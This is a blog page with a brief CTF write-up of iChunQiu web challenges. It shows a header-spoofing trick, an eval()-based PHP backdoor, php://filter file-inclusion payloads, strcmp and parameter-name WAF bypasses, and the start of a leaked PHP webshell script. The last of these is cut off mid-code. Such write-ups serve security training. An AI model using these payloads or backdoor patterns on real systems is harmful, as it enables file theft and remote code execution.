<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>iChunQiu WEB 1 :: FanBig&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="iChunQiu WEB 1 禁止访问 client-ip: 192.168.1.1 签到 if (a.currentLevel &amp;gt; a.maxLevel) { var IAvaDcnZ1 = prompt(&amp;#34;\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x2c\x20\x70\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3a&amp;#34;)[&amp;#39;\x74\x72\x69\x6d&amp;#39;](); $.ajax({ url: &amp;#39;\x66\x6c\x61\x67\x2e\x70\x68\x70&amp;#39;, type: &amp;#39;\x50\x4f\x53\x54&amp;#39;, data: &amp;#39;\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3d&amp;#39; &#43; IAvaDcnZ1, success: function (StRvT3) { var StRvT3 = StRvT3; console[&amp;#39;\x6c\x6f\x67&amp;#39;](StRvT3) } }) window[&amp;#34;\x61\x6c\x65\x72\x74&amp;#34;](&amp;#34;\u606d\u559c\u4f60\u5f97\u5230\x66\x6c\x61\x67\u4e86\uff0c\u53bb\u5bfb\u627e\u5427\x7e\uff01&amp;#34;); a.fire(&amp;#34;gameEnd&amp;#34;); return; } 转成字符串即可
遗留的压缩包 &amp;lt;?php # leet if (md5($_GET[&amp;#39;pwd&amp;#39;]) == &amp;#39;217f81b8ff0a1ab138a8e1bdc031262e&amp;#39;) { eval($_POST[&amp;#39;1337&amp;#39;]); } www.zip发现源码，直接读flag即可
Web 01 &amp;lt;?php $f = $_GET[&amp;#34;file&amp;#34;]; if(!isset($f)){ $f = &amp;#39;config&amp;#39;; // flag in flag.php } include($f.&amp;#39;.php&amp;#39;); echo &amp;#39;&amp;lt;img src=&amp;#34;&amp;#39;."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<meta property="og:title" content="iChunQiu WEB 1" />
<meta property="og:description" content="iChunQiu CTF WEB" />
<meta property="og:type" content="article" />
<meta property="og:url" content="//localhost:1313/posts/ichunqiu-web-1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-13T13:13:40+08:00" />
<meta property="article:modified_time" content="2024-03-13T13:13:40+08:00" />


<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="iChunQiu WEB 1"/>
<meta name="twitter:description" content="iChunQiu CTF WEB"/>


<link rel="canonical" href="//localhost:1313/posts/ichunqiu-web-1/" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="stylesheet" href="/css/index.990d326724754f27d5d9e8d3b865873e6b1c3f7e92dcc20f80375591db4b9835.css">









  
</head>
<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
  <header class="flex flex-none justify-center z-10">
    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
  <div class="flex-none ml-2 md:ml-0">
    <a href="/" class="">
      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/images/1.jpg" alt="logo">
    </a>
  </div>
  <div class="flex-1"></div>
  <div class="flex-none">
    



<nav class="h-full static">
  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
    <span class="sr-only">Open main menu</span>
    <i class="w-8 h-8">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 6l16 0" />
  <path d="M4 12l16 0" />
  <path d="M4 18l16 0" />
</svg>

    </i>
  </button>
  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
    
        <li id="about" class="">
          <a class="block px-3 py-3 hover:text-emerald-600"
            href="/about/" title="About">About</a>
        </li>
      
    
        <li id="post" class="">
          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
            href="/posts/" title="Post">Post</a>
        </li>
      
    
    </ul>
  </div>
</nav>


  </div>
  
  <div class="flex-none mx-1"></div>
  
  <div class="flex-none md:hidden">
    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
      <span class="sr-only">Search</span>
      <i class="w-8 h-8">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
    <path d="M21 21l-6 -6" />
</svg>

      </i>
    </a>
  </div>
  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
   <path d="M12 5l0 .01"></path>
   <path d="M17 7l0 .01"></path>
   <path d="M19 12l0 .01"></path>
   <path d="M17 17l0 .01"></path>
   <path d="M12 19l0 .01"></path>
   <path d="M7 17l0 .01"></path>
   <path d="M5 12l0 .01"></path>
   <path d="M7 7l0 .01"></path>
</svg>

        </i>
        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
   <path d="M19 11h2m-1 -1v2"></path>
</svg>

        </i>
      </div>
    </label>
  </div>
</div>

  </header>
  <main class="flex flex-auto justify-center">
    
<div class="w-full max-w-4xl lg:max-w-5xl">
  <div class="flex flex-col gap-y-3 p-6 mt-6 mx-2 md:mx-0 rounded-lg shadow-md bg-white dark:bg-gray-700">
    <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
      <a href="/posts/ichunqiu-web-1/">iChunQiu WEB 1</a>
    </h1>

    
    <h2 class="my-4 text-large text-slate-600 dark:text-slate-300">
      iChunQiu CTF WEB
    </h2>
    
    
  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
    
      
      <li>
        <a href="/categories/ctf/"
          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
          CTF
        </a>
      </li>
      
    
    
      
      <li>
        <a href="/tags/web/"
          class="flex flex-row text-sm mr-2 py-1">
          <i class="h-5 w-5 flex-none">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tags" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M3 8v4.172a2 2 0 0 0 .586 1.414l5.71 5.71a2.41 2.41 0 0 0 3.408 0l3.592 -3.592a2.41 2.41 0 0 0 0 -3.408l-5.71 -5.71a2 2 0 0 0 -1.414 -.586h-4.172a2 2 0 0 0 -2 2z"></path>
   <path d="M18 19l1.592 -1.592a4.82 4.82 0 0 0 0 -6.816l-4.592 -4.592"></path>
   <path d="M7 10h-.01"></path>
</svg>

          </i>
          <span class="ml-0">WEB</span>
        </a>
      </li>
      
    
  </ul>



    <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
  
  
  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
   <path d="M16 3v4"></path>
   <path d="M8 3v4"></path>
   <path d="M4 11h16"></path>
   <path d="M11 15h1"></path>
   <path d="M12 15v3"></path>
</svg>

    </i>
    <time datetime="2024-03-13T13:13:40&#43;08:00">
      2024-03-13
    </time>
  </div>

  <div class="flex flex-row text-base gap-x-1">
    <i class="h-6 w-6 flex-none">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M6.5 7h11"></path>
   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
</svg>

    </i>
    <span>
      42 minutes to read
    </span>
  </div>
</div>


    
      
      <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
        <h2>Table of Contents</h2>
        <aside><nav id="TableOfContents">
  <ul>
    <li><a href="#禁止访问">禁止访问</a></li>
    <li><a href="#签到">签到</a></li>
    <li><a href="#遗留的压缩包">遗留的压缩包</a></li>
    <li><a href="#web-01">Web 01</a></li>
    <li><a href="#web-12">Web 12</a></li>
    <li><a href="#web-11">Web 11</a></li>
    <li><a href="#web-10">Web 10</a></li>
    <li><a href="#web-09">Web 09</a></li>
    <li><a href="#web-08">Web 08</a></li>
    <li><a href="#文件包含绕过">文件包含绕过</a></li>
  </ul>
</nav></aside>
      </section>
      
    

    <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
      <h1 id="ichunqiu-web-1">iChunQiu WEB 1</h1>
<h2 id="禁止访问">禁止访问</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">client-ip</span>: <span style="color:#ae81ff">192.168.1.1</span>
</span></span></code></pre></div><h2 id="签到">签到</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">currentLevel</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">maxLevel</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">IAvaDcnZ1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prompt</span>(<span style="color:#e6db74">&#34;\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x2c\x20\x70\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3a&#34;</span>)[<span style="color:#e6db74">&#39;\x74\x72\x69\x6d&#39;</span>]();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({ <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;\x66\x6c\x61\x67\x2e\x70\x68\x70&#39;</span>, <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;\x50\x4f\x53\x54&#39;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;\x6e\x69\x63\x6b\x6e\x61\x6d\x65\x3d&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">IAvaDcnZ1</span>, <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">StRvT3</span>) { <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">StRvT3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">StRvT3</span>; <span style="color:#a6e22e">console</span>[<span style="color:#e6db74">&#39;\x6c\x6f\x67&#39;</span>](<span style="color:#a6e22e">StRvT3</span>) } })
</span></span><span style="display:flex;"><span>    window[<span style="color:#e6db74">&#34;\x61\x6c\x65\x72\x74&#34;</span>](<span style="color:#e6db74">&#34;\u606d\u559c\u4f60\u5f97\u5230\x66\x6c\x61\x67\u4e86\uff0c\u53bb\u5bfb\u627e\u5427\x7e\uff01&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">fire</span>(<span style="color:#e6db74">&#34;gameEnd&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>转成字符串即可</p>
<h2 id="遗留的压缩包">遗留的压缩包</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># leet
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>($_GET[<span style="color:#e6db74">&#39;pwd&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;217f81b8ff0a1ab138a8e1bdc031262e&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;1337&#39;</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>www.zip发现源码，直接读flag即可</p>
<h2 id="web-01">Web 01</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$f <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($f)){
</span></span><span style="display:flex;"><span>    $f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;config&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// flag in flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>($f<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.php&#39;</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;&#39;</span><span style="color:#f92672">.</span>$img<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34; alt=&#34;Err&#34; /&gt;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!-- .bak --&gt;
</span></span></span></code></pre></div><p>文件读取时没有回显，需要进行base64编码才能正常显示</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">read</span><span style="color:#f92672">=</span><span style="color:#a6e22e">string</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">read</span><span style="color:#f92672">=</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span></code></pre></div><h2 id="web-12">Web 12</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;secret.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">waf</span>($s)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $blocklist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php_engineer&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($s, $blocklist) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Could you hack me?!&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;php_engineer&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>($elephant, $_POST[<span style="color:#e6db74">&#39;php_engineer&#39;</span>])) {
</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">waf</span>($data);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;FLAG: flag{xxxxxx}&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;You aren&#39;t a php engineer.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>先是strcmp使用数组绕过，再是strpos可以使用变量名混淆绕过，php在处理非法字符时会默认替换成_所以可以利用</p>
<pre tabindex="0"><code>php.engineer[]=asd
php engineer[]=asd

php8以上可以使用以下
php[engineer[]=asd
</code></pre><h2 id="web-11">Web 11</h2>
<p>.git泄露，直接用工具扒源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// @set_magic_quotes_runtime(0);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>$mtime <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#a6e22e">microtime</span>());
</span></span><span style="display:flex;"><span>$starttime <span style="color:#f92672">=</span> $mtime[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> $mtime[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;SA_ROOT&#39;</span>, <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;\\&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>)) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;IS_WIN&#39;</span>, <span style="color:#a6e22e">DIRECTORY_SEPARATOR</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\\&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;IS_COM&#39;</span>, <span style="color:#a6e22e">class_exists</span>(<span style="color:#e6db74">&#39;COM&#39;</span>) <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;IS_GPC&#39;</span>, <span style="color:#a6e22e">get_magic_quotes_gpc</span>());
</span></span><span style="display:flex;"><span>$dis_func <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_cfg_var</span>(<span style="color:#e6db74">&#39;disable_functions&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// define(&#39;IS_PHPINFO&#39;, (!eregi(&#34;phpinfo&#34;,$dis_func)) ? 1 : 0 );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;IS_PHPINFO&#39;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($_POST <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IS_GPC</span>) {
</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_array</span>($value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $$key <span style="color:#f92672">=</span> $value;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*===================== 程序配置 =====================*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果需要密码验证,请修改登陆密码,留空为不需要验证
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;728193099115dcaa67805a0776785b3a&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// cookie 前缀
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cookiepre <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// cookie 作用域
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cookiedomain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// cookie 作用路径
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cookiepath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// cookie 有效期
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cookielife <span style="color:#f92672">=</span> <span style="color:#ae81ff">86400</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//程序搜索可写文件的类型
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">!</span>$writabledb <span style="color:#f92672">&amp;&amp;</span> $writabledb <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php,cgi,pl,asp,inc,js,html,htm,jsp&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*===================== 配置结束 =====================*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$charsetdb <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;armscii8&#39;</span>, <span style="color:#e6db74">&#39;ascii&#39;</span>, <span style="color:#e6db74">&#39;big5&#39;</span>, <span style="color:#e6db74">&#39;binary&#39;</span>, <span style="color:#e6db74">&#39;cp1250&#39;</span>, <span style="color:#e6db74">&#39;cp1251&#39;</span>, <span style="color:#e6db74">&#39;cp1256&#39;</span>, <span style="color:#e6db74">&#39;cp1257&#39;</span>, <span style="color:#e6db74">&#39;cp850&#39;</span>, <span style="color:#e6db74">&#39;cp852&#39;</span>, <span style="color:#e6db74">&#39;cp866&#39;</span>, <span style="color:#e6db74">&#39;cp932&#39;</span>, <span style="color:#e6db74">&#39;dec8&#39;</span>, <span style="color:#e6db74">&#39;euc-jp&#39;</span>, <span style="color:#e6db74">&#39;euc-kr&#39;</span>, <span style="color:#e6db74">&#39;gb2312&#39;</span>, <span style="color:#e6db74">&#39;gbk&#39;</span>, <span style="color:#e6db74">&#39;geostd8&#39;</span>, <span style="color:#e6db74">&#39;greek&#39;</span>, <span style="color:#e6db74">&#39;hebrew&#39;</span>, <span style="color:#e6db74">&#39;hp8&#39;</span>, <span style="color:#e6db74">&#39;keybcs2&#39;</span>, <span style="color:#e6db74">&#39;koi8r&#39;</span>, <span style="color:#e6db74">&#39;koi8u&#39;</span>, <span style="color:#e6db74">&#39;latin1&#39;</span>, <span style="color:#e6db74">&#39;latin2&#39;</span>, <span style="color:#e6db74">&#39;latin5&#39;</span>, <span style="color:#e6db74">&#39;latin7&#39;</span>, <span style="color:#e6db74">&#39;macce&#39;</span>, <span style="color:#e6db74">&#39;macroman&#39;</span>, <span style="color:#e6db74">&#39;sjis&#39;</span>, <span style="color:#e6db74">&#39;swe7&#39;</span>, <span style="color:#e6db74">&#39;tis620&#39;</span>, <span style="color:#e6db74">&#39;ucs2&#39;</span>, <span style="color:#e6db74">&#39;ujis&#39;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;utf8&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=utf-8&#34;</span>);
